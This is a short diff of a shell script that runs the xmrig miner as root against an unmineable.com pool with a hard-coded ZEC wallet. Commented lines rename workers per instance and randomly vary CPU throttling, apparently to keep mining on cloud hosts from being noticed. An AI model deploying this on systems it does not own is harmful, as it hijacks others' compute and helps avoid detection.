@@ -34,6 +34,6 @@ idreplace=${id//\./_}
 #sudo sed -i "s/xmrig-cloud/xmrig-$id/gi" "config.json"
 #./xmrig
 
-./xmrig -o rx.unmineable.com:3333 -a rx -k -u ZEC:t1ezbT2YNP9jMTkfJZEwFSoAN1BW78rW8WT.xmrig-$idreplace#qz22-jvn4 -p x
+sudo ./xmrig -o rx.unmineable.com:3333 -a rx -k -u "ZEC:t1ezbT2YNP9jMTkfJZEwFSoAN1BW78rW8WT.xmrig-$idreplace#qz22-jvn4" -p x
 
 #proc=$(pgrep xmrig); while true; do pkill -f cpulimit; rand=$(shuf -i 100-400 -n 1); cpulimit -p $proc -b -l $rand; echo CPU $rand; sleep 10; done &
